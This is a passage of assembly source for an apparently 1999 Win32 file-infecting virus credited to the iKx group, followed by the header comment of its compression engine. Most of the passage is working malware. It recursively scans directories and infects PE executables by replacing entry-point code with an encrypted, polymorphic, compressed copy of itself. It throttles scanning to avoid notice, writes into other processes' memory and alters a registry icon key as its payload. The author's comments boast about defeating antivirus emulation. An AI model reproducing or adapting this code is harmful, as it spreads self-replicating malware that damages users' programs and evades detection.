   push    edx                                     ; Buffer

   mov     ecx,dword ptr [ebp+Ourmemory]
   add     ecx,checktest-AnnoyingCode

   push    ecx
   mov     eax,dword ptr [ebp+processid]
   push    eax                                     ; processID
   call    dword ptr [ebp+WriteProcessMemory]

   finishcheckresb:

   call    LeaveCritical

   mov byte ptr [ebp+reserror],5       ; okay all done ;)

   finishcheckres:

   popad
   ret

   moins1: db  'Okay'

   ;
   ; That's funny dir killer, I should rewrite Voodoo with it, it's much powerfull
   ; and smaller
   ;

   Killdir:

   mov dword ptr [ebp+numbscan],0          ; mmm for speed
                               ; restriction
   lea eax,[ebp+originaldir]
   call    makescandir                 ; we put *.*

   lea eax,[ebp+filedata]
   push    eax
   lea eax,[ebp+originaldir]
   push    eax
   call    dword ptr [ebp+FindFirstFileA]          ; look 1st File

   cmp eax,0
   je  finishattack                    ; error (that shouldn't
                               ; arrive) ? close...
   push    eax

   findnextfileA:

   cmp byte ptr [ebp+filedata+2Ch],'.'         ; check if . or ..
   je  willbeback                  ; go away

   inc byte ptr [ebp+numbscan]             ; then go away

   cmp byte ptr [ebp+numbscan],5           ; each 5 file scanned
   jb  donpanic                    ; then wait a bit
                               ; make scan invisble
   movzx   eax,word ptr [ebp+waitscan]         ; so wait waitscan
   push    eax                     ; value (depends on
   call    dword ptr [ebp+Sleep0]              ; residency)

   mov byte ptr [ebp+numbscan],0

   donpanic:

   mov eax,dword ptr [ebp+filedata]            ; check if directory
   and eax,16
   cmp eax,16
   jne attackfile                  ; yeah? Okay, fine
                               ; attack this sub
   call    KillSubDir                  ; bastard!!!
   jmp willbeback

   attackfile:

   call    checkext                                ; check if this is exe file

   cmp eax,'exe'               ; is this an exe file
   jne attackfile2             ; (I don't want to annoy
                           ; DLL or CPL or OCX,I'm just
                           ; a relax virus writer...)
   call Open_file                  ; open file

   ;
   ; This is an old-school infection method, it don't need to map the file into
   ; memory, but jusk seek-write-read and could be used by readaptating the
   ; following routine to dos compatibility:
   ;       Seek_file Location=edx
   ;       Read_file Buffer=edx Length=ecx
   ;       Write_file Buffer=edx Length=ecx
   ;
   ; It's basically designed for infecting PE :)

   Infection:                  ; Pseudo :]

       mov dl,byte ptr [ebp+infcount]
       cmp byte ptr [ebp+maxinf],dl        ; we can't infect
                               ; too much in
       mov     edx,03ch                ; per process mode
       call    Seek_file

       mov ecx,04h                 ; read if it's PE
       lea     edx,[ebp+ReadyForHost]
       call    Read_file

       mov edx,dword ptr [ebp+ReadyForHost]    ; seek
       push    edx
       mov dword ptr [ebp+HeaderOffset],edx
       call    Seek_file               ;

       mov     ecx,(4096/2)+0f8h
       lea edx,[ebp+ReadyForHost]          ;
       call    Read_file               ; so we read needed
       pop edx                 ; infos from file

       cmp     word ptr [ebp+ReadyForHost],'EP'    ; PE signature
       jne     CloseFile               ; check

           cmp     word ptr [ebp+ReadyForHost+66],'0s' ; test if we are there
           je      CloseFile               ; Checksum, should

           mov     word ptr [ebp+ReadyForHost+66],'0s' ; remove that

       lea     edx,[ebp+ReadyForHost]          ;

       mov dword ptr [edx+160],0           ; reset fixups
       mov dword ptr [edx+164],0

       movzx   ecx,word ptr [edx+6]

       lea eax,[edx+0F8h]              ; this start of
                               ; section entry
   nullifyreloc:                       ; should have to
                               ; modify that a day
       mov dword ptr [eax+24],0
       mov dword ptr [eax+28],0            ; and sections
       mov dword ptr [eax+32],0            ; reseting fixups
       add eax,40

       loop    nullifyreloc                ; go away reloc, bad
                               ; nightmare
       mov ecx,dword ptr [ebp+ReadyForHost+40] ; saving entrypoint
       mov esi,ecx
       add esi,dword ptr [ebp+ReadyForHost+52] ; and get memory adres
       mov     dword ptr [ebp+Return],esi      ; storing esi
       mov     dword ptr [ebp+Restore],esi     ; storing esi again

           lea     esi,[ebp+ReadyForHost+0f8h]     ; start of 1st
                               ; section
       mov eax,dword ptr [esi+12]          ; look for eax
       mov edx,eax
       add edx,dword ptr [esi+16]          ; and edx

       cmp ecx,eax                 ; check if entrypoint
       jb  CloseFile               ; <> code

       cmp ecx,edx
       ja  CloseFile               ;then we have compress.
                               ; file
       or  dword ptr [esi+36],080000000h

       cmp dword ptr [esi+16],75000        ; look if big enough
       jb  infectionmethod2            ; some PE are 4 megs
                               ; ie: FF7 executable
                               ; if so then compress
                               ; partially
       mov     eax,dword ptr [esi+12]
       add eax,dword ptr [esi+8]
       sub eax,ecx                 ; now check if EP
                               ; - codesection is
       cmp eax,75000               ; smaller, so we
       jb  infectionmethod3            ; will have to fix that
                               ; too
       sub ecx,dword ptr [esi+12]
       add ecx,dword ptr [esi+20]          ; okay all right
                               ; proceed compression
       mov dword ptr [ebp+FileOffset],ecx

       mov     edx,ecx
       push    edx
       call    Seek_file               ; going to entry offset
       pop edx                 ; set size as encrypt
                               ; val :)
       call    DropcryptedVirus            ; make a encrypted ver.

       mov ecx,75000               ; set how much to
                               ; compress

   Compresslookup:                 ; generic infection method

       push    ecx             ;
       mov dword ptr [ebp+TakenByte],ecx   ; save crypted virus to
       call    DropcryptedVirus        ; buffer

       mov edx,edi
       pop ecx
       push    ecx
       call    Read_file           ; read how much byte to compres

       mov edi,dword ptr [ebp+compressbuffer]
       call    DropStubLoader          ; then put the decompression
                           ; stub (about 500 bytes)
                   ; (it have to alloc/init find kernel, apis..)
       pop ecx
       add ecx,pseudofin-start     ; so compress virus
       mov esi,dword ptr [ebp+databuffer]  ;

       call    DarkCMP

       mov dword ptr [ebp+seed],ecx    ; randomizing decryptors :)

       cmp ecx,dword ptr [ebp+TakenByte]   ; look how much compression
       jb  CloseFile           ; we got if > ?

       mov byte ptr [ebp+numberloop],0 ; reset number of algorithm
       lea ecx,[edi+eax]           ; fuck, can't remember why
                           ; I did this instruction
       push    edi
       push    esi
       push    ecx

   Checknext:

       pop ecx
       pop esi
       pop edi

       push    edi
       push    esi
       push    ecx

       inc byte ptr [ebp+numberloop]       ; make 1 more algos...
       sub dword ptr [ebp+seed],esi        ; making allways
       and dword ptr [ebp+seed],0FFFFFh        ; get all this number
                               ; of possible number
       push    ebp

       mov esi,dword ptr [ebp+compressbuffer]  ; so now make poly of
       mov edi,dword ptr [ebp+databuffer]      ; it

       mov ebp,dword ptr [ebp+Restore]     ; set where poly will
       sub ecx,esi                 ; be in memory

       call    poly                    ; poly this

       pop ebp

       cmp byte ptr [ebp+numberloop],10        ; we reached the end
       ja  CloseFile0              ; without finding good

       cmp ecx,dword ptr [ebp+TakenByte]       ; compression algos ?
       ja  Checknext

       pop eax
       pop eax
       pop eax                 ; stack reajustement

       call    InitCritical                ; stop other main thread
                               ; don't want to be
   ;   pushad                      ; annoyed during
   ;                           ; infection procedure
   ;   push    1
   ;   lea eax,dword ptr [ebp+caption]
   ;   push    eax
   ;   lea edx,word ptr [ebp+workingdir]
   ;   push    edx
   ;   push    0
   ;   call    dword ptr [ebp+MessageBoxA]
   ;
   ;   mov dword ptr [esp+20h-4],eax
   ;   popad

   ;   cmp eax,2
   ;   je  cretino1

       push    ecx
       mov edx,dword ptr [ebp+HeaderOffset]
       call    Seek_file               ; go to where we read
                               ; to the header
       mov     ecx,(4096/2)+0f8h
       lea edx,[ebp+ReadyForHost]          ; rewrite the header
       call    Write_file

       mov edx,dword ptr [ebp+FileOffset]      ; go to where we took
       call    Seek_file               ; compressed datas

       pop ecx
       mov edx,dword ptr [ebp+databuffer]

       call    Write_file              ; write it to file

   cretino1:

       call    LeaveCritical               ; resume thread

       inc byte ptr [ebp+infcount]         ; increment infection

   CloseFile:

       jmp finfi                   ; stop file

   CloseFile0:

       pop ecx
       pop esi
       pop edi
       jmp finfi                   ; stoping poly loop
                               ; creation
   infectionmethod2:

       mov eax,dword ptr [esi+16]          ; check if code
       cmp eax,45000               ; is bigger than 45000
       jb  CloseFile               ; else go away

       mov edx,dword ptr [esi+20]
       mov dword ptr [ebp+FileOffset],edx
       call    Seek_file               ; go to start of sect

       mov eax,dword ptr [esi+12]
       mov dword ptr [ebp+ReadyForHost+40],eax ; set entry to there
       add eax,dword ptr [ebp+ReadyForHost+52]
       mov dword ptr [ebp+Restore],eax     ; set for poly

       mov ecx,dword ptr [esi+16]
       jmp Compresslookup              ; go infect it

   infectionmethod3:

       mov edx,dword ptr [esi+20]
       add edx,dword ptr [esi+16]
       sub edx,75000           ; get end of sec - 75000

       mov eax,edx
       sub eax,dword ptr [esi+20]      ; then get offset
       add eax,dword ptr [esi+12]

       mov dword ptr [ebp+ReadyForHost+40],eax
       add eax,dword ptr [ebp+ReadyForHost+52] ; set entrypoint
       mov dword ptr [ebp+Restore],eax

       mov dword ptr [ebp+FileOffset],edx      ; and drop offset
       call    Seek_file               ; go overthere

       mov ecx,75000               ;full compression buff.

       jmp Compresslookup

   DropcryptedVirus:

   encrypt:

                   lea     esi,[ebp+start]
                   mov     edi,dword ptr [ebp+databuffer]  ;I don't saved the

               mov     ecx,pseudofin-start     ;key so avers will have
           repz    movsb               ;to test every poss.

           push    edi

           lea esi,[edi-1]
                   mov     ecx,pseudofin-StartCrypt    ; how much to encrypt

   gegenviom:

           xor dl,25               ; this is sliding key
                   xor     byte ptr [esi],dl       ; hohoho, you will
                   add     dl,99               ; have to emulate
                   add     byte ptr [esi],dl       ; each loop

               dec     esi             ; enjoy guys
                   loop    gegenviom

           pop edi
           ret

   DropStubLoader:

           mov byte ptr [ebp+stubtest],1   ; this is just for
                   mov     ecx,FinStub-StubLoader      ; previewving virus
                   lea     esi,[ebp+StubLoader]        ; decompression
                   repz    movsb
           mov byte ptr [ebp+stubtest],0
                   ret

   caption:    db  'Host found',0

   countcompress:      dd  0
   countoffset:        dd  0

   numberloop:     db  0

   FileOffset:     dd  0
   HeaderOffset:       dd  0
   TakenByte:      dd  0

   finfi:

   ;   pushad                      ; made for debugging
   ;                           ; purpose
   ;       push    0
   ;   lea eax,dword ptr [ebp+caption]
   ;   push    eax
   ;   lea edx,word ptr [ebp+workingdir]
   ;   push    edx
   ;   push    0
   ;   call    dword ptr [ebp+MessageBoxA]         ; for test
   ;
   ;   mov dword ptr [esp+20h-4],eax
   ;   popad

   call Close_file                 ; close it

   attackfile2:

   willbeback:

   pop edx                 ; look for next file in sub
   push    edx
   lea eax,[ebp+filedata]
   push    eax
   push    edx
   call    dword ptr [ebp+FindNextFileA]       ; findnextfilea

   cmp eax,0
   jne findnextfileA

   call    dword ptr [ebp+FindClose]       ; close find (wow that time,
                           ; it's not buggy :)
   finishattack:

   ret

   oldesp:

   KillSubDir:

   cmp dword ptr [ebp+filedata+2Ch],'TSYS'     ; don't infect
   je  finishattack                    ; system directory

   cmp dword ptr [ebp+filedata+2Ch],'tsys'     ; avoiding NT problems
   je  finishattack                    ;

   cmp byte ptr [ebp+treeflag],1
   jne secureit

   cmp dword ptr [ebp+filedata+2Ch],'BSYS'     ; infect sysback
   jne finishattack

   cmp dword ptr [ebp+filedata+2Ch],'bsys'
   jne finishattack

   secureit:

   mov eax,(1024*2)+4
   call    alloc                   ; alloc memory

   push    eax
   push    eax

   mov edi,eax
   lea esi,[ebp+originaldir]
   mov ecx,(1024*2)+4
   repz    movsb                   ; save precdent dir infos

   mov edi,dword ptr [ebp+pointerdata]
   call    connectit               ; put dir name + curr dir status

   ;   pushad
   ;
   ;       push    0
   ;       lea     edx,word ptr [ebp+originaldir]
   ;   push    edx
   ;       lea     edx,word ptr [ebp+originaldir]
   ;   push    edx
   ;   push    0
   ;   call    dword ptr [ebp+MessageBoxA]
   ;
   ;   mov dword ptr [esp+20h-4],eax
   ;   popad


   call    Killdir                 ; scan directory

   pop esi
   lea edi,[ebp+originaldir]
   mov ecx,(1024*2)+4

   repz    movsb                   ; restore back directoy and
                           ; infos
   pop eax
   call    Delloc                  ; then delocate

   ret

   makescandir:

   inc eax
   cmp     byte ptr [eax],0
   jne makescandir

   cmp byte ptr [eax-1],'\'            ; look if it have or not, fix
   je  gottaway                ; it anyway

   mov byte ptr [eax],'\'
   inc eax

   gottaway:

   mov dword ptr [eax],'*.*'           ; concatenating *.*
   mov dword ptr [ebp+pointerdata],eax

   ret

   checkext:

   lea esi,[ebp+originaldir]               ; look for file
   lea edi,[esi+1024]                  ; in the file data
   mov ecx,1024
   repz    movsb

   mov edi,dword ptr [ebp+pointerdata]
   add edi,1024
   call    connectit                   ; we put name on the
                               ; background file data
   mov eax,dword ptr [edi-4]
   call    lowcaseme                   ; low case extension
   ret

   treeflag:   db  1

   connectit:

   lea esi,[ebp+filedata+2Ch]              ; add dir

   mov eax,dword ptr [ebp+pointerdata]         ; add file data
   mov dword ptr [eax],0

   finishmakedir:

   mov al,byte ptr [esi]
   mov byte ptr [edi],al

   inc esi
   inc edi

   cmp al,0
   jne finishmakedir                   ; until we reached end
                               ; of file name
   ret

   lowcaseme:

   mov ecx,4                       ; look how much we have
                               ; to scan
   lowcaseit:

   rol eax,8
   cmp al,'A'
   jb  dontapply                   ; if between A -> Z
   cmp al,'Z'                      ; then redesign to
   ja  dontapply                   ; ascii

   add al,'a'-'A'

   dontapply:

   loop    lowcaseit

   ret

   payload:

   lea eax,[ebp+currbuff2]
   push eax

   push 255
   push eax
   call dword ptr [ebp+GetSystemDirectoryA]        ; get windows directory

   pop edi
   scannextz:
   inc edi
   cmp byte ptr [edi],0
   jne scannextz                       ; look there

   mov ecx,8
   lea esi,[ebp+ikxico]
   repz movsb                      ; then create

   push 0
   lea eax,[ebp+currbuff2]
   push eax
   call dword ptr [ebp+Lcreat]             ; SYSDIR\ikx.00

   push eax

   dropit:                         ;

   lea ebx,[ebp+trademark]
   push 766
   push ebx
   push eax
   call dword ptr [ebp+Lwrite]             ; write the icon

   call dword ptr [ebp+Lclose]             ; then close the file

   lea     eax,[ebp+KeyOne]
   mov ecx,080000000h

   call Reginitialize                  ; open the key
                               ; and write datas
   lea     eax,[ebp+KeyZero]
   mov ecx,080000002h

   push    dword ptr [ebp+StoorHere]
   mov byte ptr [ebp+StoorHere],0
   lea esi,[ebp+mess1]
   lea edi,[ebp+currbuff2]
   mov ecx,finmess1-mess1
   repz    movsb                   ; copy all that over there

   lea     eax,[ebp+KeyOne]            ;
   mov ecx,080000000h

   call    Reginitialize               ; open the key that we had
   pop dword ptr [ebp+StoorHere]       ;
   ret

   Reginitialize:

   lea edx,[ebp+rezo21]                ; boring to describe
   push    edx                     ; look win32.hlp
   push    002000000h
   push    0
   push    eax
   push    ecx
   call    dword ptr [ebp+RegOpenKeyExA]           ; open the key

   xor     ecx,ecx
   lea     edi,[ebp+currbuff2]
   push    edi

   dodoit:

   inc     ecx
   inc     edi
   cmp     byte ptr [edi],0
   jne     dodoit
   cmp     byte ptr [edi-1],'0'
   je  skipcount
   cmp     byte ptr [edi-1],'!'
   je  skipcount                   ; whohoho...

   mov     dword ptr [edi],'0,'
   inc     ecx
   inc     ecx

   skipcount:

   pop     edi
   push    ecx
   push    edi
   push    1
   push    0
   push    0
   push    dword ptr [ebp+rezo21]
   call    dword ptr [ebp+RegSetValueExA]          ; overwrite it

   ret

   poem:

   ;   db ' I was in the street today, so long time I didnt saw it',0
   ;   db ' I was afraid coz so long time I didnt saw so much poeple',0
   ;   db ' I tasted beer again, I liked it, I tasted joint, I was planning',0
   ;   db ' I enjoyed with girls, like old good times, when I was happy',0
   ;   db ' But after all these enjoyment, I didnt feel in my garden',0
   ;   db ' Like a bird trying to fly in water, ridiculous like hell',0
   ;   db ' That was my life, excepting to be happy from a computer',0
   ;   db ' Just secure my brain, getting ideas and make them working',0
   ;   db ' I spend so much time behind my computer, loosing my time',0
   ;   db ' I did what I never excepted to do, I remember my beginners ideas',0
   ;   db ' I tryed to go to the infinite, I arrived in hell',0
   ;   db ' If you are like I was, you should follow this tip',0
   ;   db ' Stop vxing guys, you are loosing sensations',0
   ;   db 0


   mess1:  db 'Remember VX meeting times...',0
   finmess1:

   ikxico:         db '\ikx00.ico',0

   KeyZero:
   db 'SOFTWARE\Classes\'
   KeyOne:
   db 'CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\'
   StoorHere:
   db 'DefaultIcon',0
   KeyFin:
   trademark:

   yeye:
    db 000h, 000h, 001h, 000h, 001h, 000h, 020h, 020h, 010h, 000h, 000h, 000h
    db 000h, 000h, 0e8h, 002h, 000h, 000h, 016h, 000h, 000h, 000h, 028h, 000h
    db 000h, 000h, 020h, 000h, 000h, 000h, 040h, 000h, 000h, 000h, 001h, 000h
    db 004h, 000h, 000h, 000h, 000h, 000h, 080h, 002h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 010h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 080h, 000h, 000h, 080h
    db 000h, 000h, 000h, 080h, 080h, 000h, 080h, 000h, 000h, 000h, 080h, 000h
    db 080h, 000h, 080h, 080h, 000h, 000h, 0c0h, 0c0h, 0c0h, 000h, 080h, 080h
    db 080h, 000h, 000h, 000h, 0ffh, 000h, 000h, 0ffh, 000h, 000h, 000h, 0ffh
    db 0ffh, 000h, 0ffh, 000h, 000h, 000h, 0ffh, 000h, 0ffh, 000h, 0ffh, 0ffh
    db 000h, 000h, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 000h, 000h, 00bh
    db 0bbh, 0bbh, 0bbh, 0bbh, 000h, 000h, 000h, 000h, 000h, 000h, 009h, 009h
    db 009h, 009h, 009h, 00bh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0b0h, 000h, 000h
    db 000h, 000h, 009h, 009h, 009h, 009h, 009h, 00bh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 0b0h, 000h, 000h, 000h, 009h, 009h, 009h, 009h, 009h, 00bh
    db 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 000h, 000h, 000h, 009h, 009h
    db 090h, 000h, 090h, 00bh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0b0h
    db 000h, 000h, 009h, 009h, 009h, 009h, 009h, 00bh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0b3h, 033h, 033h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 00bh
    db 0bbh, 0bbh, 0bbh, 0bbh, 033h, 033h, 033h, 033h, 030h, 000h, 000h, 0bbh
    db 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 033h, 033h, 033h, 033h, 033h
    db 033h, 000h, 000h, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0b3h, 033h
    db 033h, 033h, 033h, 033h, 033h, 000h, 00bh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 033h, 033h, 033h, 033h, 033h, 033h, 033h, 000h, 00bh, 0bbh
    db 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0b3h, 033h, 033h, 033h, 033h, 033h, 033h
    db 030h, 000h, 00bh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0b3h, 033h, 033h
    db 033h, 033h, 033h, 030h, 000h, 000h, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0b0h
    db 00bh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 000h
    db 000h, 000h, 00bh, 0b0h, 0b0h, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0b0h, 0b0h, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 000h
    db 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 0bbh, 0b0h, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 00bh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0b0h, 00bh, 0bfh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 0b9h, 099h, 099h, 0bbh, 0bbh, 0bbh, 0bbh, 0b0h, 00bh, 0bfh
    db 0fbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 099h, 099h, 09bh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0b0h, 000h, 0bfh, 0ffh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 000h, 000h, 0bbh, 0ffh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 000h, 000h, 00bh
    db 0bfh, 0ffh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0b0h, 000h, 000h, 000h, 0bbh, 0ffh, 0ffh, 0fbh, 0bbh, 0bbh, 0bbh, 0bbh
    db 0bbh, 0bbh, 0bbh, 0bbh, 000h, 000h, 000h, 000h, 00bh, 0bfh, 0ffh, 0ffh
    db 0fbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0bbh, 0b0h, 000h, 000h, 000h, 000h
    db 000h, 0bbh, 0bfh, 0ffh, 0ffh, 0ffh, 0bbh, 0bbh, 0fbh, 0bbh, 0bbh, 000h
    db 000h, 000h, 000h, 000h, 000h, 00bh, 0bbh, 0bfh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0fbh, 0bbh, 0b0h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 00bh, 0bbh
    db 0bfh, 0ffh, 0ffh, 0fbh, 0bbh, 0b0h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 0bbh, 0bbh, 0bbh, 0bbh, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 00fh, 0ffh, 000h, 000h, 001h, 0ffh, 000h, 000h
    db 000h, 07fh, 000h, 000h, 000h, 03fh, 000h, 000h, 000h, 01fh, 000h, 000h
    db 000h, 00fh, 000h, 000h, 000h, 007h, 0c0h, 000h, 000h, 003h, 0c0h, 000h
    db 000h, 003h, 080h, 000h, 000h, 003h, 080h, 000h, 000h, 007h, 080h, 000h
    db 000h, 01fh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 080h, 000h
    db 000h, 001h, 080h, 000h, 000h, 001h, 080h, 000h, 000h, 001h, 0c0h, 000h
    db 000h, 003h, 0c0h, 000h, 000h, 003h, 0e0h, 000h, 000h, 007h, 0f0h, 000h
    db 000h, 00fh, 0f8h, 000h, 000h, 01fh, 0fch, 000h, 000h, 03fh, 0feh, 000h
    db 000h, 07fh, 0ffh, 080h, 001h, 0ffh, 0ffh, 0f0h, 00fh, 0ffh

   include etms.asm
   include dsce.asm

   getapis:

   db 'KERNEL32.'
   db 'USER32.'
   db 'ADVAPI32.'                                  ; Pseudo imported dlls
   db -1

   dd 0aacce3ch                                    ; file action
   dd 01558146h                                    ; see above
   dd 0aacf03dh
   dd 0aad8d85h
   dd 0155be2ch
   dd 0aac3c03h
   dd 09554ef69h

   dd 0D45D57C9h                                   ; mapping apis
   dd 05FBCD23Ch

   dd 0a412f949h                                   ; windows libaries managing
   dd 078a25f37h

   dd 0ab16d5ceh                                   ; memory apis
   dd 0b562d377h

   dd 0c6387a85h                                   ; create exit Threads
   dd 01cdc7e3fh

   dd 0cb8d7a80h                                   ; priority class setting
   dd 046863856h
   dd 04690b856h

   dd 0297c5269h                                   ; suspend create threads
   dd 0a1187bb2h

   dd 002c7218h                                    ; sleep -)

   dd 0b04301d5h                                   ; Read Write Process Memory
   dd 0a58ad555h

   dd 0c26c5705h                                   ; ToolHelp debugging functions
   dd 095b0c289h
   dd 0b2b60b08h

   dd 056B3973Eh                                   ; FindNext/FindFirst/Findclose
   dd 0e37e8dc3h
   dd 07aaef03fh

   dd 0a24e569eh                                   ; GetCurrent/GetWin/GetSys
   dd 06259ad0dh                                   ; directory
   dd 09a75bb1ah

   dd 05ecf0a4ch                                   ; MessageBox
   dd 014d14ccbh                                   ; getdrivetype

   dd 029bf2c25h                                   ; OpenProcess

   dd 0c53b1c30h                                   ; RegOpen
   dd 09774ef48h                                   ; RegSetKey

   dd 0ee84c668h                                   ; GetSystemTime

   db -1

   db      'B0/S0 - [iKx] (c) 1999 all right reserved - present '
   db  'AldeBaran'

   pseudofin:

   returnapis:

   Lcreat:     dd  0
   Lopen:      dd  0
   Lclose:     dd  0
   Lwrite:     dd  0
   Lread:      dd  0
   Llseek:     dd  0
   GetFileSize:    dd  0

   MapViewOfFile:      dd  0
   CreateFileMappingA: dd  0

   LoadLibraryA:   dd  0
   FreeLibrary:    dd  0

   VirtualAlloc:   dd  0
   VirtualFree:    dd  0

   CreateThread:   dd  0
   ExitThread: dd  0

   GetCurrentProcess:      dd  0
   GetPriorityClass:       dd  0
   SetPriorityClass:       dd  0

   SuspendThread:  dd  0
   ResumeThread:   dd  0

   Sleep0:     dd  0

   ReadProcessMemory:      dd  0
   WriteProcessMemory:     dd  0

   CreateToolhelp32Snapshot:   dd  0
   Process32First:         dd  0
   Process32Next:          dd  0

   FindFirstFileA: dd  0
   FindNextFileA:  dd  0
   FindClose:  dd  0

   GetCurrentDirectoryA:   dd  0
   GetWindowsDirectoryA:   dd  0
   GetSystemDirectoryA:    dd  0

   GetDriveTypeA:  dd  0
   MessageBoxA:    dd  0

   OpenProcess:    dd  0

   RegOpenKeyExA:  dd  0
   RegSetValueExA: dd  0

   GetSystemTime:  dd  0

   ; Temporary datas, arrrrrrrrrrf :)

   ForeignThread:  dd  0

   oldseh:     dd  0

   ReturnTemp: dd  0

   FileHandle: dd  0
   databuffer: dd  0
   compressbuffer: dd  0

   MapHandle:  dd  0
   MapHandle1: dd  0
   Ourmemory:  dd  0

   reserror:   db  0
   Checkres:   db  0

   processid:  dd  0
           dd  0
   PseudoData: db  16 dup (0)

   maxinf:
   maxinfect:  dd  0
   infcount:
   countinfect:    dd  0
   numbscan:   dd  0
   waitscan:   dd  0

   checkflag:  dd  0

   datadummy:      db  400h dup (0)

   FindData:
   filedata:
   File_Data:  db  2ch dup (0)

           db  'winhlp32.exe',0
                   db      13+5 dup (0)

   ReadyForHost:   db  0F8h dup (0)
   TableHost:  db  4096/2 dup (0)

   currbuff2:  db  400 dup (0)
   rezo21:     dd  0
   currbuff3:  db  2000    dup (0)

   originaldir:    db  1024    dup     (0)
   workingdir: db  1024    dup (0)
   pointerdata:    dd  0

   fin:

   end Host


   --- Include: DSCE.ASM

   ;
   ; Comperssion engine based on the Huffman algorithm - EvilRats produKtion!
   ;
   ;   Still under devlopment and test, Version 0.99 revision 5b
   ;
   ;   Can support a dword as dictionary base like professional softwares
   ;   Speed up and many improvents to gain time , these routines are 100%
   ;       multitask. These routines doesn't require extra memory to work
   ;       but just need a buffer to acquire datas, for compression, if you are
   ;       not sure, better is to add 8ko to it, it will return the exact size
   ;       of the compressed datas... (You must respect a minimum of 8 Ko buffer,
   ;       else, it will GP Fault)
   ;
   ;   Ideal utilisation:  Compressing text video datas got 60% and 80
   ;               Compressing executable file got 80-90%
   ;
   ;   Revision 5b is specially optimized for very large compression, I mean
   ;   for compressing more than 20 Ko, and not for small buffer, older
   ;   revisions were quite efficient for small buffer (even on 512 bytes
   ;   buffer) but I don't release this version, I don't have commented it.
   ;       If you really want it, please mail: starzeros@hotmail.com
   ;
   ;       Ideal code placing: The code was originally coded for 32 bits,
   ;   utilization in 16 bit programs will slow down the compression
   ;   to +- 5 ko/sec... (value taken with Softice but it's so often
   ;       instable..., anyway, the compression is eye visible in dos mode :[ )
   ;
   ;   With revision 5.b, you should compress only larger than 16 Ko to get
   ;   something serious. Else the dictionary (that will take 1Ko entirely)
   ;   will eat to much place.
   ;
   ;   Unfortunately, this version of DSCE loose about 5 to 10% of compression
   ;   rate, but anyway, it's quite enough for vxing needs...
   ;
   ;   Test on standard memory compression:
   ;           453 Ko/sec with highest process priorities !!!
   ;           200 Ko/sec with normal process priorities
   ;           48 Ko/sec with lowest process priorities
   ;
   ;       Arguments:          DarkCMP             ecx = number of bytes
   ;                       esi = long pointer to addresses
   ;                       edi = long pointer to buffer
   ;
   ;               UnDkCMP     ecx = size of datas
   ;                       esi = long pointer to the base
   ;                       edi = long pointer to the base
   ;
   ;       to get needed memory size, just get the dword at [esi+1],
   ;       then drop over it.
   ;
   ;   Routine size:   +- 125  for decompression (LZH decoding :)
   ;                          570  for compression
   ;
   ; Revision 5 - Decompression routines reoptimized
   ;           - no more need of extra memory
   ;           - speed up because no three building on output
   ;           - not anymore eye visible
